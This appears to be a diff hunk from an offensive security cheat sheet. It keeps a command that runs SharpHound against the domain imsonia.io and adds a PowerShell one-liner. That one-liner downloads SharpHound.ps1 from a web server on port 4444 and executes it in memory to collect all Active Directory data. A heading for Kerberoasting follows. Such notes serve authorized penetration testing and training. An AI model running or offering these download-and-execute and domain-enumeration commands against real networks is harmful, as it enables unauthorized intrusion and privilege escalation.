@@ -1,5 +1,6 @@
 ```
 execute-assembly C:\tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -D imsonia.io 
+IEX(System.Net.WebClient.DownloadString('http://webserver:4444/SharpHound.ps1'));Invoke-CollectionMethod All
 ```
 
 ### Kerberoasting
